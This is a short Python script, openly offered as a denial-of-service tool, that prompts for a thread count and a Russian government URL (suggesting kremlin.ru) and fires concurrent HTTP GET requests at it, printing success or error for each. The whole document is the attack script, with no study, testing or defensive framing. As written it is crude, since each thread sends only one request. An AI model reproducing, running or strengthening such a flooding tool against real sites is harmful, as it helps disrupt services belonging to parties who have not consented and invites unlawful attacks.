import requests
import threading
from colorama import init, Fore
workers = int(input("How much workers? (Please put a number): "))
url = input("Please put the russian gov you want to DoS (for ex 'https://kremlin.ru'): ")
init()
def asd():
    d = requests.get(url)
    global count
    if d.status_code == 200:
        count += 1
        print(Fore.GREEN + "[" + str(count) + "]" + " Success!")
    else:
        print(Fore.RED + "Error!")
count = 0
for i in range(workers):
    threading.Thread(target=asd).start()